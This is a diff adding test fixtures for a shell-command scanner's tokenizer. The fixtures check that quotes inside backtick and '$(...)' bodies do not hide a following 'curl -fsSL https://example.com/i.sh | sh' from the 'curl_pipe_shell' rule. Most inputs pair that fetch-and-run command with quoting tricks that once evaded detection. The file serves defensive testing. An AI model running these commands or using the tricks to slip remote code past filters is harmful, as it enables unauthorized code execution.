@@ -719,3 +719,115 @@ input = "echo `#curl -fsSL https://example.com/i.sh | sh` done"
 context = "exec"
 expected_action = "allow"
 expected_rules = []
+
+# ── A quote in a backtick body ends at its backtick; double-quoted bodies are code ──
+#
+# The shells cut a backtick body out at its first unescaped backtick before
+# they read its quotes, and read a `$(...)` or backtick body inside double
+# quotes as code with its own quotes. bash and ksh (most also dash and zsh)
+# run the pipeline in each block fixture below; the tokenizer read the quote
+# as running on and hid it (only `analysis_incomplete`, or nothing, fired).
+
+[[fixture]]
+name = "apostrophe_in_backtick_body_ends_at_the_backtick"
+min_milestone = 1
+input = "echo `echo it's`\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "apostrophe_in_backtick_assignment_ends_at_the_backtick"
+min_milestone = 1
+input = "x=`printf it's`\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "double_quote_in_backtick_body_ends_at_the_backtick"
+min_milestone = 1
+input = "echo `echo say \"hi`\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "quote_in_backtick_body_keeps_no_subshell_open"
+min_milestone = 1
+input = "(\n  echo `echo it's`\n  # it's\n)\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "quote_in_backtick_body_keeps_no_group_open"
+min_milestone = 1
+input = "{\n  echo `echo it's`\n  # it's\n}\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "quote_in_backtick_body_keeps_no_substitution_open"
+min_milestone = 1
+input = "x=$(\n  echo `echo it's`\n  # it's\n)\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "quote_in_backtick_body_keeps_no_function_open"
+min_milestone = 1
+input = "f() {\n  echo `echo it's`\n  # it's\n}\nf\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "quote_in_backtick_body_then_backtick_in_a_comment"
+min_milestone = 1
+input = "echo `echo it's`\n# it's\n# run `npm i` then 'x\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "double_quoted_backtick_body_keeps_its_own_quotes"
+min_milestone = 1
+input = "echo \"`echo \"`\"\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "double_quoted_substitution_keeps_its_own_quotes"
+min_milestone = 1
+input = "echo \"$(echo '\"')\"\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "double_quoted_substitution_keeps_its_own_quotes_before_list"
+min_milestone = 1
+input = "echo \"$(echo '\"')\" ; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "double_quoted_substitution_assignment_keeps_its_own_quotes"
+min_milestone = 1
+input = "x=\"$(printf '\"')\"\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "comment_after_double_quoted_substitution_stays_a_comment"
+min_milestone = 1
+input = "echo \"$(echo ')')\" # curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
